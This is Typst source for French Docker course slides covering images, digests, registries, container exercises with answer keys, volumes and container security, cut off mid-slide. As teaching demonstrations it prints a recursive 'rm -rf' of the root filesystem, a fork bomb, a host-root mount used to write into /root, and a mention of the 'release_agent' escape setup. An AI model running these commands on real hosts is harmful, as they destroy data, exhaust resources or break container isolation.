#let _note = [Fil à suivre à l’oral, de haut en bas, sans changer de diapositive. 1) Le tag hello-world:latest pointe sur l’index (bleu) : un simple sommaire, qui donne pour chaque plateforme le digest d’un manifeste ; c’est le « Digest » affiché par le pull et par docker image ls --digests. 2) Docker choisit le manifeste de sa plateforme, linux/amd64 (vert) : la fiche de l’image, qui donne le digest de la config et ceux des couches compressées. Son empreinte d1a8… n’apparaît dans aucune sortie locale ; le terminal de droite montre où la lire. 3) La config (orange) : commande, variables, historique, et la liste des couches décompressées ; son empreinte est l’IMAGE ID. 4) La couche compressée (jaune) est téléchargée, puis décompressée (rose) : même contenu, octets différents, donc empreintes différentes. Extraits réels de docker manifest inspect (docker.io 26.1.5 de Debian 13, 17 novembre 2026), raccourcis ; la commande demande le digest complet : sha256:d1a8d0a4eeb63aff09f5f34d4d80505e0ba81905f36158cc3970d8e07179e59e. L’index de hello-world cite 20 manifestes (plateformes et attestations). Attention aux sources récentes : Docker 29 en amont, avec le magasin containerd par défaut, affiche l’index comme IMAGE ID.]
#anime(
  note(role: "question")[Une image, une couche, quatre empreintes. Que désigne chacune ? Sur le registre : un *index* cite des *manifestes* (un par plateforme) ; un manifeste cite une *config* et des *couches*.],
  lignes(largeur: px(240), taille: px(26),
    ([`1e4c05b897a7`], [*Index* : sommaire multi-plateforme de l'image. C'est le « Digest » affiché à la fin du pull]),
    ([`e2ac70e7319a`], [*Config* : réglages de l'image (commande, variables…), cite les couches décompressées. C'est l'IMAGE ID]),
    ([`4f55086f7dd0`], [*Couche compressée* (archive tar.gz), citée par le manifeste : affichée pendant le pull]),
    ([`897b3f2a7c1b`], [*Couche décompressée* : la couche telle que `docker image inspect` la montre]),
  ),
  note: _note,
)

== Tag ou digest : figer une image
#let _note = [Sorties réelles (docker.io 26.1.5 de Debian 13). Le digest affiché est celui de l’index, le même que le « Digest: » du pull (diapositive « quatre empreintes »).]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.3)[Terminal][
      #terminal(taille: px(15))[
  ```
  $ docker image ls --digests \
    --format '{{.Repository}}:{{.Tag}} {{.Digest}}'
  debian:13 sha256:9c6e381421d0f48d…
  $ docker container run --rm \
    debian@sha256:9c6e381421d0f48d… \
    cat /etc/debian_version
  13.7
  ```
      ]
    ],
    bloc(role: "retenir")[À retenir][
      - *Tag* (`debian:13`) : étiquette déplacée à chaque mise à jour de l'image
      - *Digest* (`debian@sha256:…`) : toujours exactement le même contenu
      - Pour relancer plus tard exactement la même image : le *digest*
    ],
  ),
  note: _note,
)

== Registres : où vivent les images
#let _note = [Diapositive placée après « Tag ou digest » : image, tag, pull et push sont connus. docker.io/library/ est le préfixe implicite des images officielles de Docker Hub (visible dans la sortie du premier pull : « Pulling from library/hello-world »). GHCR : documentation GitHub « Working with the Container registry » ; pour relier l’image à son dépôt, LABEL org.opencontainers.image.source\=https://github.com/\<compte\>/\<dépôt\> dans le Dockerfile.]
#anime(
  rang(
    bloc[Registre][
      - Un serveur qui stocke et distribue des images : `docker image pull` télécharge, `docker image push` publie
      - Nom complet `registre/compte/image:tag` ; sans registre, Docker Hub : `debian:13` = `docker.io/library/debian:13`
      - Docker Hub (quotas de pull depuis nov. 2020), GHCR (`ghcr.io`), Quay, registres privés
    ],
    bloc[GHCR : le registre de GitHub][
      - Images nommées `ghcr.io/<compte>/<image>:<tag>`, rattachées à un compte ou un dépôt GitHub
      - Privées à la première publication ; rendues publiques, téléchargeables sans compte
      - Publier : `docker login ghcr.io` avec un jeton `write:packages` ; dans GitHub Actions, `GITHUB_TOKEN` suffit
    ],
  ),
  note: _note,
)

== Inspecter et nettoyer
#let _note = [Sortie réelle (docker.io 26.1.5 de Debian 13).]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.4)[Terminal][
      #terminal(taille: px(15))[
  ```
  $ docker container ls -a
  CONTAINER ID   IMAGE         STATUS                   NAMES
  a6ae41d6d9bc   hello-world   Exited (0) 20 sec ago    nice_bell
  $ docker container inspect --format='{{.ID}}' nice_bell
  a6ae41d6d9bc0778e6413a5e7625263c9230d24f87c4018…
  $ docker container rm nice_bell
  $ docker image rm hello-world
  Untagged: hello-world:latest
  Deleted: sha256:e2ac70e7319a…
  ```
      ]
    ],
    bloc(role: "retenir")[À retenir][
      - Nom aléatoire si aucun n'est donné (`--name` sinon)
      - Un début d'identifiant non ambigu suffit
      - `rm` un conteneur, `image rm` une image ; `prune` fait le ménage
    ],
  ),
  note: _note,
)

== Premiers conteneurs : cas faciles
#let _note = [À faire en direct en CM. Laisser chercher avant de passer au corrigé.]
#anime(
  rang(
    bloc(role: "question")[À vous][
      + Exécutez `/bin/bash` dans un conteneur interactif `debian`
      + Exécutez `/bin/ls` dans un conteneur non interactif `debian`
      + Le même, interactif, nommé « mon_conteneur_c0 »
      + Détachez-vous de « mon_conteneur_c0 » avec `Ctrl+p Ctrl+q`
      + Rattachez-vous à « mon_conteneur_c0 », puis sortez-en
      + Listez les conteneurs actifs, puis tous les conteneurs
      + Supprimez tous les conteneurs inactifs en une commande (`docker container --help`)
    ],
  ),
  note: _note,
)

== Premiers conteneurs : cas faciles, corrigé (1/2)
#let _note = [Sur debian:13 (docker.io 26.1.5 de Debian 13). Questions rappelées à gauche ; un clic par réponse.]
#anime(
  stack(spacing: px(18),
    corrige(1, [Exécutez `/bin/bash` dans un conteneur interactif `debian`],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container run -it debian /bin/bash
  ```])),
    corrige(2, [Exécutez `/bin/ls` dans un conteneur non interactif `debian`],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container run debian /bin/ls
  ```])),
    corrige(3, [Le même, interactif, nommé « mon_conteneur_c0 »],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container run -it --name mon_conteneur_c0 debian
  ```])),
    corrige(4, [Détachez-vous avec `Ctrl+p Ctrl+q`],
      reponse(terminal(titre: none, taille: px(18))[```
  # Ctrl+p Ctrl+q : détaché, le conteneur continue
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : cas faciles, corrigé (2/2)
#let _note = [Sur debian:13 (docker.io 26.1.5 de Debian 13). Questions rappelées à gauche ; un clic par réponse.]
#anime(
  stack(spacing: px(18),
    corrige(5, [Rattachez-vous à « mon_conteneur_c0 », puis sortez-en],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container attach mon_conteneur_c0
  # exit  → bash se termine, le conteneur s'arrête
  ```])),
    corrige(6, [Listez les conteneurs actifs, puis tous],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container ls        # actifs
  $ docker container ls -a     # tous
  ```])),
    corrige(7, [Supprimez tous les conteneurs inactifs en une commande],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container prune     # tous les conteneurs arrêtés ; sinon, préférer --rm
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : un service
#let _note = [À faire en direct en CM, après les cas faciles. Laisser chercher avant de passer au corrigé.]
#anime(
  rang(
    bloc(role: "question")[À vous][
      + Lancez `nginx` en *arrière-plan*, nommé « web », en publiant son port 80 sur le port 8080 de l'hôte (`docker container run --help`)
      + Vérifiez qu'il répond depuis l'hôte (`curl`)
      + Affichez son journal
      + Exécutez `nginx -v` dans le conteneur qui tourne
      + Arrêtez-le, puis supprimez-le
    ],
  ),
  note: _note,
)

== Premiers conteneurs : un service, corrigé (1/2)
#let _note = [Sortie réelle (docker.io 26.1.5 de Debian 13). curl n’est pas installé par défaut sur Debian 13 : apt install curl, ou ouvrir http://localhost:8080 dans un navigateur. Questions rappelées à gauche ; un clic par réponse.]
#anime(
  stack(spacing: px(18),
    corrige(1, [Lancez `nginx` en arrière-plan, nommé « web », port 80 → 8080 de l'hôte],
      reponse(terminal(titre: none, taille: px(17))[```
  $ docker container run -d --name web -p 8080:80 nginx
  d83c4687ebb092cfffbe6c59fdcaa71a87d93ad1400c855a…
  # -d : arrière-plan ; -p port de l'hôte:port du conteneur
  ```])),
    corrige(2, [Vérifiez qu'il répond depuis l'hôte (`curl`)],
      reponse(terminal(titre: none, taille: px(17))[```
  $ curl -s localhost:8080 | grep title
  <title>Welcome to nginx!</title>
  ```])),
    corrige(3, [Affichez son journal],
      reponse(terminal(titre: none, taille: px(17))[```
  $ docker container logs web | tail -1
  172.17.0.1 - - [13/Nov/2026:15:23:47] "GET / HTTP/1.1" 200 896
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : un service, corrigé (2/2)
#let _note = [Sortie réelle (docker.io 26.1.5 de Debian 13). curl n’est pas installé par défaut sur Debian 13 : apt install curl, ou ouvrir http://localhost:8080 dans un navigateur. Questions rappelées à gauche ; un clic par réponse.]
#anime(
  stack(spacing: px(18),
    corrige(4, [Exécutez `nginx -v` dans le conteneur qui tourne],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container exec web nginx -v
  nginx version: nginx/1.31.8
  ```])),
    corrige(5, [Arrêtez-le, puis supprimez-le],
      reponse(terminal(titre: none, taille: px(18))[```
  $ docker container stop web && docker container rm web
  # stop arrête, rm supprime
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : cas pénibles
#let _note = [Les questions 2 et 7 à 9 utilisent ubuntu, et non debian, parce que l’image ubuntu contient ps (absent de l’image debian, paquet procps). Utiliser docker container run et les autres sous-commandes de docker container ; docker container cmd --help pour l’aide de cmd.]
#anime(
  rang(
    bloc(role: "question", taille: px(24))[À vous][
      + `/bin/bash` interactif dans `alpine`
      + `/bin/ps -eflH` non interactif dans `ubuntu`
      + « echo hello world ! » non interactif dans `debian` nommé « c1 », puis `start c1` et `logs c1`
      + `/bin/bash` non interactif `debian` « c2 », puis `start c2` et `logs c2`
      + `/bin/bash` interactif `ubuntu` « c3 », sortez, puis `start c3`, `exec` un nouveau bash, détachez-vous
      + Listez les processus de c3 depuis l'hôte, puis depuis le conteneur
      + `sleep 300` détaché « c4 », arrêtez-le (durée ? code ?) ; recommencez avec `--init`
    ],
  ),
  note: _note,
)

== Premiers conteneurs : cas pénibles, corrigé (1/5)
#let _note = [Question 2 : sortie réelle sur l’image ubuntu, le 17 novembre 2026 ; le conteneur ne voit que ses propres processus, et la commande lancée y porte le PID 1. L’image debian ne contient pas ps (paquet procps), d’où le choix d’ubuntu ici et pour c3. Sur debian:13 et alpine 3.24 (docker.io 26.1.5 de Debian 13). c1 : docker container logs affiche deux lignes « hello world ! ». c2 : code de sortie 0, journal vide. c3 : docker container start garde bash en vie (tty et stdin ouverts) ; c4 : docker container stop mesuré à 10 s, code 137 ; avec --init, immédiat, code 143 ; c3 (ubuntu) : docker container top donne les PID vus de l’hôte, docker container exec c3 ps -e ceux du conteneur. Avec -t seul, l’invite s’affiche mais rien n’atteint bash. Le cours d’origine utilisait centos, image abandonnée depuis la fin de vie de CentOS Linux (juin 2024).]
#anime(
  stack(spacing: px(18),
    corrige(1, [`/bin/bash` interactif dans `alpine`],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container run -it alpine /bin/bash
  ... exec: "/bin/bash": stat /bin/bash: no such file or directory
  # alpine n'a que sh
  ```])),
    corrige(2, [`/bin/ps -eflH` non interactif dans `ubuntu`],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container run ubuntu /bin/ps -eflH
  F S UID  PID PPID ... CMD
  4 R root   1    0 ... /bin/ps -eflH
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : cas pénibles, corrigé (2/5)
#let _note = [Sur debian:13 et alpine 3.24 (docker.io 26.1.5 de Debian 13). c1 : docker container logs affiche deux lignes « hello world ! ». c2 : code de sortie 0, journal vide. c3 : docker container start garde bash en vie (tty et stdin ouverts) ; c4 : docker container stop mesuré à 10 s, code 137 ; avec --init, immédiat, code 143 ; docker container top donne le PID hôte (2108 lors du test), docker container exec c3 ps -ef après apt install procps montre /bin/bash en PID 1. Avec -t seul, l’invite s’affiche mais rien n’atteint bash. Le cours d’origine utilisait centos, image abandonnée depuis la fin de vie de CentOS Linux (juin 2024).]
#anime(
  stack(spacing: px(18),
    corrige(3, [« echo hello world ! » non interactif `debian` « c1 »],
      reponse(terminal(titre: none, taille: px(16))[```
  $ docker container run --name c1 debian echo hello world !
  hello world !
  ```])),
    corrige(4, [`start c1`, puis `logs c1`],
      reponse(terminal(titre: none, taille: px(16))[```
  $ docker container start c1
  $ docker container logs c1
  hello world !
  hello world !
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : cas pénibles, corrigé (3/5)
#let _note = [Suite du corrigé. c3 est un conteneur ubuntu : cette image contient ps, utile à la question 9 (l’image debian ne l’a pas). Sorties réelles (docker.io 26.1.5 de Debian 13).]
#anime(
  stack(spacing: px(16),
    corrige(5, [`/bin/bash` non interactif `debian` « c2 »],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container run --name c2 debian /bin/bash
  # rien : sans -i, bash lit la fin de fichier et sort
  ```])),
    corrige(6, [`start c2`, puis `logs c2`],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container start c2 && docker container logs c2
  # journal vide
  ```])),
    corrige(7, [`/bin/bash` interactif `ubuntu` « c3 », puis sortez-en],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container run -it --name c3 ubuntu /bin/bash
  # exit
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : cas pénibles, corrigé (4/5)
#let _note = [Suite du corrigé. Sorties réelles (docker.io 26.1.5 de Debian 13, image ubuntu), le 17 novembre 2026. Clic 3 : l’explication. Au détachement, docker affiche « read escape sequence ». Deux bash tournent : le PID 1, relancé par docker container start, et le PID 8, lancé par docker container exec ; Ctrl+p Ctrl+q détache le terminal sans arrêter le processus. docker container top interroge l’hôte : il donne les PID de l’espace de noms de l’hôte (519, 560 ; ils varient). ps dans le conteneur donne ceux de l’espace de noms PID du conteneur (1, 8), plus ps lui-même. Numérotation : dans chaque espace de noms, le noyau attribue les PID dans l’ordre et ne réutilise un numéro qu’après avoir fait le tour ; ps ne montre que les processus encore vivants. Pour entrer dans le conteneur, docker container exec (runc) crée plusieurs processus et threads de courte durée qui consomment des numéros. Mesuré sur 26.1.5 : avec sleep en PID 1, trois docker container exec successifs donnent à la commande les PID 7, 14 puis 21, soit 7 numéros par exec. Le.bashrc d’un bash interactif en consomme aussi (lesspipe, dircolors). Sur l’hôte, entre 519 et 560 : ces mêmes processus de Docker, plus tout ce qui tourne sur la machine. c3 est en ubuntu car l’image debian ne contient pas ps (paquet procps).]
#anime(
  stack(spacing: px(16),
    corrige(8, [`start c3`, `exec` un nouveau bash, puis détachez-vous],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container start c3        # bash repart : -it est mémorisé
  $ docker container exec -it c3 /bin/bash
  # Ctrl+p Ctrl+q : détaché, ce bash continue de tourner
  ```])),
    corrige(9, [Processus de c3 depuis l'hôte, puis depuis le conteneur],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container top c3 -o pid,cmd      $ docker container exec c3 ps -e
  PID  CMD                                   PID  CMD
  519  /bin/bash                               1  bash
  560  /bin/bash                               8  bash
  # 519/560 sur l'hôte = 1/8 dans le conteneur (namespace pid)
  ```])),
  ),
  note: _note,
)

== Premiers conteneurs : cas pénibles, corrigé (5/5)
#let _note = [Fin du corrigé. Sorties réelles (docker.io 26.1.5 de Debian 13). time affiche aussi user et sys, omis. Sur Debian, docker-init est tini (paquet tini). Le noyau ne délivre au PID 1 d’un espace de noms que les signaux pour lesquels il a installé un gestionnaire ; seuls SIGKILL et SIGSTOP envoyés depuis l’espace parent passent outre. Clic 3 : l’explication.]

#slide(repeat: 2, self => {
  let (uncover,) = utils.methods(self)
  corrige(10, [`sleep 300` détaché « c4 », arrêtez-le : durée, code ? Recommencez avec `--init`],
    uncover("2-", reponse(terminal(titre: none, taille: px(16))[```
$ docker container run -d --name c4 debian sleep 300
$ time docker container stop c4          → real 0m10.120s
$ docker container inspect -f '{{.State.ExitCode}}' c4   → 137
$ docker container run -d --init --name c5 debian sleep 300
$ time docker container stop c5          → real 0m0.108s
$ docker container inspect -f '{{.State.ExitCode}}' c5   → 143
```])))
  v(px(16))
  uncover("2-", note(role: "retenir")[`stop` envoie SIGTERM. Sans `--init`, `sleep` est PID 1 et l'ignore → SIGKILL après 10 s (137 = 128+9). Avec `--init`, tini relaie le signal → arrêt immédiat (143 = 128+15).])
  if _note != none { utils.speaker-note(self: self, _note) }
})


== --init : un init minimal en PID 1
#let _note = [Sur docker.io 26.1.5 de Debian 13. Avec --init, /proc/1/cmdline vaut « /sbin/docker-init -- … » (tini du paquet Debian). Zombies : bash -c '(sleep 1 &); exec sleep 300' laisse sans --init un \[sleep\] \<defunct\> enfant du PID 1 ; avec --init, tini le récolte (docker container top ne montre pas les zombies : ps --ppid sur l’hôte). Forme shell : docker container run debian sh -c 'sleep 300' donne un PID 1 sh avec sleep en enfant ; docker container stop prend 10 s, code 137. Le noyau ne délivre au PID 1 d’un espace de noms que les signaux pour lesquels il a un gestionnaire (sauf SIGKILL et SIGSTOP envoyés depuis l’espace parent). Documentation Docker (consultée le 16/11/2026) : docs.docker.com/build/building/best-practices/ : « CMD should almost always be used in the form of CMD \["executable", "param1", "param2"\] » ; script d’entrée terminé par exec « so that the final running application becomes the container's PID 1 \[…\] This allows the application to receive any Unix signals sent to the container » ; « Limiting each container to one process is a good rule of thumb, but it's not a hard and fast rule ». Pour tout l’hôte : "init": true dans /etc/docker/daemon.json. docs.docker.com/engine/containers/multi-service\_container/ : « If your process falls into this category, you can use the --init option » (processus principal qui ne récolte pas ses enfants) ; --init « inserts a tiny init-process into the container as the main process ».]
#anime(
  rang(
    bloc(role: "avertissement")[Sans `--init`][
      - *PID 1* : votre programme reçoit seul les signaux de `docker container stop`
      - ✗ pas de gestionnaire de SIGTERM : signal ignoré, SIGKILL après 10 s
      - ✗ ses orphelins finis restent *zombies* (Z)
    ],
    bloc(role: "pratique")[Avec `--init`][
      - *PID 1* : init `/sbin/docker-init` (tini), injecté par Docker
      - → *PID 2* : votre programme, signaux par défaut
      - ✓ relaie SIGTERM, SIGINT… : arrêt immédiat
      - ✓ récolte les orphelins : plus de zombies
    ],
  ),
  note(role: "precaution")[« tini » : sans doute _tiny init_, un init minuscule.],
  note: _note,
)

= Bases · Persistance

== Volatilité des données
#let _note = none
#anime(
  rang(
    bloc(role: "pratique", poids: 1.2)[Une expérience plus ambitieuse][
      #terminal(taille: px(15))[
  ```
  $ docker container run -it debian /bin/bash
  # rm -rf --no-preserve-root /
  rm: cannot remove '/etc/resolv.conf': Device or resource busy
  # … plus de 15 000 lignes : /proc et /sys protégés
  # ls
  bash: ls: command not found
  # exit
  $ docker container run -it --rm debian bash   # conteneur neuf
  ```
      ]
    ],
    bloc(role: "retenir")[Résumé][
      - Un `rm -rf` dans le conteneur ne touche que sa couche en écriture
      - Supprimer le conteneur supprime ses données
      - Pour garder des données : un *volume* (diapositive suivante)
    ],
  ),
  note: _note,
)

== Persistance : bind mount ou volume
#let _note = [Sur docker.io 26.1.5 de Debian 13 : docker volume create donnees ; docker container run --rm -v donnees:/data debian sh -c "echo persiste \> /data/f" ; docker container run --rm -v donnees:/data debian cat /data/f affiche « persiste ». Point de montage : /var/lib/docker/volumes/donnees/\_data. Ressources partagées (NFS, iSCSI, FC) : pilote de volume. Doc Docker (docs.docker.com/engine/storage/volumes, consultée le 16/11/2026) : « Volumes are the preferred mechanism for persisting data generated by and used by Docker containers » ; « bind mounts are dependent on the directory structure and OS of the host machine » ; « Docker copies the directory’s contents into the volume ». Sur 26.1.5 : -v vt:/etc/apt montre le contenu de l’image (apt.conf.d, keyrings…), -v /tmp/vide:/etc/apt le masque ; un fichier créé par root dans le conteneur appartient à root sur l’hôte (piège de droits du bind mount). Les README montrent souvent un bind mount (ex. images linuxserver.io : -v /path/to/config:/config).]
#anime(
  rang(
    bloc[Bind mount][
      - Un *répertoire de l'hôte* que vous choisissez : `-v /srv/site:/usr/share/nginx/html:ro`
      - Pratique en développement ; sauvegardé avec les outils habituels, mais lié à l'arborescence de l'hôte
      - Beaucoup de README en montrent
    ],
    bloc[Volume nommé][
      - Géré par Docker dans `/var/lib/docker/volumes/…` : `-v donnees:/data`
      - `docker volume create / ls / rm` ; *survit au conteneur*
      - Recommandé par la doc Docker pour les données
    ],
  ),
  note(role: "precaution")[Avant le « : », un chemin (`/…`) → bind mount ; un nom → volume nommé.],
  note: _note,
)

== Volumes : deux pièges
#let _note = [Laisser chercher : corrigé sur la diapositive suivante.]
#anime(
  rang(
    bloc(role: "question")[À vous][
      + Montez un *dossier vide de l'hôte* sur `/usr/share/nginx/html` d'un conteneur `nginx` (`-p 8080:80`), puis ouvrez `http://localhost:8080`. Que se passe-t-il ? Et avec un *volume nommé vide* ?
      + Depuis un conteneur `debian`, créez un dossier et un fichier dans un bind mount (`mkdir /data/build && touch /data/build/sortie`). Supprimez-les depuis l'hôte, *sans sudo*. Que se passe-t-il ? Pourquoi ?
    ],
  ),
  note: _note,
)

== Volumes : deux pièges, corrigé
#let _note = [Sur docker.io 26.1.5 de Debian 13, nginx:1.29-alpine, debian:13 : dossier vide en bind mount → 403 ; volume nommé vide → 200 (pré-rempli depuis l’image) ; dossier créé par le conteneur : propriétaire 0, rm refusé à l’utilisateur 1000 ; avec --user 1000:1000, fichier à l’utilisateur.]
#anime(
  stack(spacing: px(16),
    corrige(1, [Dossier vide monté sur la racine web de nginx],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container run -d -p 8080:80 -v $PWD/vide:/usr/share/nginx/html nginx
  $ curl -s localhost:8080 | grep title
  <head><title>403 Forbidden</title></head>
  # le bind mount masque le contenu de l'image ; un volume nommé vide, lui, est
  # d'abord rempli avec le contenu de l'image
  ```])),
    corrige(2, [Fichier créé via bind mount, supprimé depuis l'hôte sans sudo],
      reponse(terminal(titre: none, taille: px(15))[```
  $ docker container run --rm -v $PWD/partage:/data debian \
      sh -c 'mkdir /data/build && touch /data/build/sortie'
  $ ls -ln partage        → drwxr-xr-x 2 0 0 ... build   (appartient à root)
  $ rm -rf partage/build  → Permission denied
  # le conteneur écrit en root (UID 0 de l'hôte) : fichiers non effaçables sans sudo
  ```])),
  ),
  note: _note,
)

= Bases · Sécurité

== Sécurité des conteneurs
#let _note = none
#anime(
  rang(
    bloc[Namespace : isolation de base][
      - Un *namespace* (espace de noms) donne à un groupe de processus sa propre vue d'une ressource du noyau : processus (pid), réseau (net), montages (mnt), nom d'hôte (uts), utilisateurs (user)…
      - Les processus d'un conteneur ne voient pas ceux d'un autre conteneur ou de l'hôte
      - Chaque conteneur a sa propre pile réseau, reliée par défaut à un _bridge_ (switch virtuel) de l'hôte
    ],
    bloc(role: "precaution")[Le prix d'un noyau partagé][
      - Sans limite de ressources (cgroups), les processus peuvent encore se gêner
      - Modifier l'isolation par défaut exige de maîtriser les *capabilities*
    ],
  ),
  note: _note,
)

== Capabilities et cgroups
#let _note = none
#anime(
  rang(
    bloc[Capabilities][
      - Les *capabilities* : les pouvoirs de root découpés en une quarantaine de privilèges unitaires (`CAP_CHOWN`, `CAP_NET_ADMIN`…)
      - Le root du conteneur est l'UID 0 de l'hôte (sauf user namespace), mais privé de nombreuses capabilities
      - Par défaut, 14 sont accordées (CHOWN, SETUID, NET_RAW, NET_BIND_SERVICE…)
      - Ajuster : `--cap-drop ALL` puis `--cap-add`
    ],
    bloc[Cgroups : limitation des ressources][
      - Comptabilité et limitation des ressources par conteneur
      - Par défaut : *aucune* limite de CPU ni de mémoire
      - Limiter : `--memory`, `--cpus`, `--cpuset-cpus`, `--pids-limit`
      - Sans limite, une _fork bomb_ fait tomber l'hôte (diapositive suivante)
    ],
  ),
  note: _note,
)

== Fork bomb : la lire, puis la contenir
#let _note = [Sur docker.io 26.1.5 (Debian 13) : docker container run -it --rm --name fb --pids-limit 100 debian:13, puis :(){ :|:& };: dans le conteneur ; le shell affiche « \[1\] 8 » (numéro de job et PID, variable) puis des « bash: fork: retry: Resource temporarily unavailable » ; docker container stats --no-stream --format "{{.Name}} {{.PIDs}}" fb affiche « fb 100 » ; docker container rm -f fb arrête tout en 0,16 s, l’hôte reste réactif. Le PID 1 compte : il reste 99 processus pour la bombe. Lecture : « : » est un nom de fonction valide en bash ; le pipe lance deux instances, « & » les détache. Autres garde-fous : ulimit -u (nproc, mais compté par UID sur tout l’hôte), pids.max du cgroup (c’est ce que règle --pids-limit), et dans Compose : pids\_limit ou deploy.resources.limits.pids. Question au public avant la démo : que va afficher docker container stats ? Pourquoi l’hôte survit-il ?]
#anime(
  rang(
    bloc(role: "danger")[Lire la bombe : `:(){ :|:& };:`][
      - `:()` définit une fonction nommée « : »
      - `{ :|:& }` : elle s'appelle *deux fois* (reliées par un pipe), en arrière-plan
      - `;:` fin de la définition, puis premier appel
      - Lisible : `bomb() { bomb | bomb & }; bomb` — 1 → 2 → 4 → 8 → … 2#super[n] processus
      - La table des processus se remplit, le CPU sature : plus rien ne démarre
    ],
    bloc(role: "pratique")[La contenir : `--pids-limit`][
      #terminal(taille: px(16))[
  ```
  $ docker container run -it --rm \
    --pids-limit 100 debian:13
  # :(){ :|:& };:
  bash: fork: retry: Resource
  temporarily unavailable
  # l'hôte n'est pas touché
  ```
      ]
    ],
  ),
  note: _note,
)

== Piège : root dans le conteneur, root sur l’hôte ?
#let _note = [Sorties réelles (docker.io 26.1.5 de Debian 13). Vu de l’hôte, le processus du conteneur tourne sous l’UID de début de la plage de dockremap (docker container top) : 165536 sur un Debian 13 dont le premier compte occupe 100000:65536. À droite, démon lancé avec "userns-remap": "default" dans /etc/docker/daemon.json : root (0) dans le conteneur \= premier UID de la plage dockremap de /etc/subuid. Docker rootless donne le même effet.]
#anime(
  rang(
    bloc(role: "danger")[Par défaut : le même UID 0][
      #terminal(taille: px(15))[
  ```
  $ docker container run -it -v /:/hote debian
  # id -u
  0
  # touch /hote/root/preuve
  $ sudo ls -l /root/preuve
  -rw-r--r-- 1 root root 0 /root/preuve
  ```
      ]
    ],
    bloc(role: "pratique")[Avec un user namespace][
      #terminal(taille: px(15))[
  ```
  $ docker container run -it -v /:/hote debian
  # id -u
  0
  # touch /hote/root/preuve
  touch: ... Permission denied
  # ls -ld /hote/root
  drwx------ 17 nobody nogroup /hote/root
  ```
      ]
    ],
  ),
  note(role: "precaution")[Même commande : seule la configuration du démon change (diapositive suivante).],
  note: _note,
)

== User namespace : activer, vérifier, désactiver
#let _note = [Sur docker.io 26.1.5 (Debian 13) en ajoutant "userns-remap": "default" au daemon.json puis en redémarrant : docker info liste « userns » dans Security Options ; DockerRootDir devient data-root/début.début de la plage ; docker container top montre l’UID de début de plage. Plage : Docker ajoute dockremap à /etc/subuid et /etc/subgid (usermod) à la première plage libre de 65536 à partir de 100000. Sur Debian 13, adduser 3.152 et useradd (passwd 4.17.4) donnent au premier compte humain 100000:65536 (SUB\_UID\_MIN/SUB\_UID\_COUNT de /etc/login.defs), comptes système exclus : sur un poste installé avec un utilisateur, dockremap reçoit donc 165536:65536 et DockerRootDir vaut /var/lib/docker/165536.165536 (en simulant ce cas). Si dockremap existe déjà sans plage, le démon refuse de démarrer (« Can't create ID mappings: no subuid ranges found for user "dockremap" »). --userns\=host rend l’UID 0 réel (un touch dans /root de l’hôte réussit). Retrait de la clé + redémarrage : Security Options revient à seccomp seul, DockerRootDir à /var/lib/docker. Les commandes docker container run restent identiques : c’est le démon qui décide. Alternative sans configuration du démon : Docker rootless (dockerd lancé par un utilisateur non privilégié).]
#anime(
  rang(
    bloc(role: "pratique")[1. Activer (tout le démon)][
      `/etc/docker/daemon.json` :
      #terminal(titre: none, taille: px(16))[```
  { "userns-remap": "default" }
  ```]
      #terminal(titre: none, taille: px(16))[```
  $ sudo systemctl restart docker
  ```]
      « default » : Docker crée l'utilisateur `dockremap` et lui réserve la première plage libre de `/etc/subuid`.
    ],
    bloc(role: "pratique")[2. Vérifier][
      #terminal(titre: none, taille: px(15))[```
  $ docker info | grep userns
   userns
  $ docker info -f '{{.DockerRootDir}}'
  /var/lib/docker/165536.165536
  $ grep dockremap /etc/subuid
  dockremap:165536:65536
  ```]
      Plage `début:taille` : UID 165536 à 231071.
    ],
  ),
  note(role: "precaution")[Désactiver : retirer la ligne de `daemon.json` et redémarrer le démon. Images et conteneurs du mode remappé vivent dans un répertoire séparé.],
  note: _note,
)

== seccomp et AppArmor : deux filets par défaut
#let _note = [Diapositive unique, volontairement : on utilise Docker sans jamais régler ces deux mécanismes, il suffit de savoir qu’ils existent et de ne pas les retirer. Pour aller plus loin à l’oral. seccomp : mécanisme du noyau depuis 2.6.12 (2005), filtres BPF depuis 3.5 (2012) ; exemple sur docker.io 26.1.5 : docker container run --rm debian unshare --map-root-user --user whoami échoue (« Operation not permitted »), et réussit avec --security-opt seccomp\=unconfined. AppArmor : exemple du montage. docker container run --rm debian:13 mount -t tmpfs none /mnt est refusé (capabilities) ; avec --cap-add SYS\_ADMIN, seccomp laisse passer mais AppArmor bloque encore (règle « deny mount » du profil docker-default) ; avec en plus apparmor\=unconfined, le montage réussit : c’est la configuration de l’évasion « release\_agent » (F. Wilhelm, 2019). La bonne réponse : docker container run --rm --tmpfs /mnt debian:13, sans rien accorder. Non rejoué ici : la ligne apparmor de docker info et le refus par AppArmor (le bac à sable utilisé n’a pas AppArmor ; sur un hôte sans AppArmor, seule la ligne seccomp apparaît). À rejouer sur un Debian 13 réel. Sources : docs.docker.com/engine/security/seccomp et /apparmor.]
#anime(
  rang(
    bloc[Deux filets du noyau][
      - *seccomp* (_secure computing mode_) : filtre les appels système ; le profil par défaut de Docker en bloque une quarantaine sur plus de 300
      - *AppArmor* : module de sécurité actif sur Debian et Ubuntu (SELinux sur Fedora, RHEL) ; le profil `docker-default` restreint fichiers, montages, `/proc`, `/sys`
